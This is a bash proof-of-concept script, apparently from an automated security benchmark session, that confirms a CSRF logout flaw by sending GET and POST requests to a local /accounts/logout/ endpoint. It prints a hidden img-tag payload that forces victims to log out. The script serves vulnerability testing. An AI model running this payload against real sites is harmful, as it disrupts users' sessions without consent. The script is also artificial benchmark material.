#!/bin/bash
# POC: Demonstrates CSRF logout vulnerability by performing an unauthorized logout via GET request to /accounts/logout/ endpoint without requiring CSRF token or POST method
# Target: ./repo
# Created: 2025-12-02T16:20:55.699Z
# Session: benchmark-XBEN-056-24-miorxlcr

# CSRF Logout Vulnerability POC
# Demonstrates that GET requests to /accounts/logout/ successfully log out users
# without requiring POST method or CSRF token validation

TARGET_URL="${1:-http://localhost:8000}"
LOGOUT_ENDPOINT="${TARGET_URL}/accounts/logout/"

echo "[*] CSRF Logout Vulnerability POC"
echo "[*] Target: $LOGOUT_ENDPOINT"
echo ""

# Test 1: GET request to logout endpoint (vulnerable behavior)
echo "[TEST 1] Sending GET request to logout endpoint (should not require authentication)"
echo "Command: curl -s -i -c cookies.txt \"$LOGOUT_ENDPOINT\""
echo ""

RESPONSE=$(curl -s -i -c cookies.txt "$LOGOUT_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -oP '(?<=HTTP/1.1 )\d+' | head -1)

echo "Response:"
echo "$RESPONSE"
echo ""

# Check if GET request was accepted (302 redirect = vulnerable)
if [ "$HTTP_CODE" = "302" ]; then
    echo "[!] VULNERABILITY CONFIRMED: GET request accepted (HTTP $HTTP_CODE)"
    echo "[!] Expected: HTTP 405 (Method Not Allowed) or 403 (Forbidden)"
    echo "[!] This allows attackers to force logout via CSRF attacks"
    echo ""
    
    # Extract redirect location
    REDIRECT=$(echo "$RESPONSE" | grep -i "^Location:" | head -1)
    echo "[*] Server redirected to: $REDIRECT"
    echo ""
    
    # Test 2: Demonstrate CSRF via HTML img tag (would force logout if victim visits)
    echo "[TEST 2] Simulating CSRF attack via HTML img tag"
    echo "[*] Attack HTML payload that would force logout:"
    echo '    <img src="'"$LOGOUT_ENDPOINT"'" style="display:none" />'
    echo ""
    
    # Simulate img tag request (same as browser would make)
    echo "[*] Simulating browser img tag request..."
    IMG_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -b cookies.txt "$LOGOUT_ENDPOINT" 2>&1)
    IMG_CODE=$(echo "$IMG_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
    
    if [ "$IMG_CODE" = "302" ]; then
        echo "[!] IMG tag request successful (HTTP $IMG_CODE)"
        echo "[!] This confirms CSRF logout is possible"
    fi
    echo ""
    
    # Test 3: Verify POST requires CSRF (shows inconsistent security model)
    echo "[TEST 3] Testing POST request (checking for CSRF requirement inconsistency)"
    echo "Command: curl -s -i -X POST \"$LOGOUT_ENDPOINT\""
    echo ""
    
    POST_RESPONSE=$(curl -s -i -X POST "$LOGOUT_ENDPOINT" 2>&1)
    POST_CODE=$(echo "$POST_RESPONSE" | grep -oP '(?<=HTTP/1.1 )\d+' | head -1)
    
    echo "Response:"
    echo "$POST_RESPONSE" | head -20
    echo ""
    
    if [ "$POST_CODE" = "403" ]; then
        echo "[!] INCONSISTENCY FOUND: POST requires CSRF (HTTP 403) but GET does not"
        echo "[!] This indicates improper security configuration"
    fi
    echo ""
    
    # Summary
    echo "[*] VULNERABILITY SUMMARY:"
    echo "    - GET requests to logout endpoint: ACCEPTED (HTTP 302) - VULNERABLE"
    echo "    - POST requests to logout endpoint: REJECTED (HTTP 403) - PROTECTED"
    echo "    - No CSRF token required for GET"
    echo "    - Inconsistent security model allows CSRF logout attacks"
    echo "    - Impact: Attackers can force logout via CSRF, enabling follow-up attacks"
    echo ""
    echo "[*] POC Successful: CSRF Logout vulnerability confirmed"
    exit 0
    
else
    echo "[!] Unexpected response: HTTP $HTTP_CODE"
    echo "[*] Could not confirm CSRF logout vulnerability"
    exit 1
fi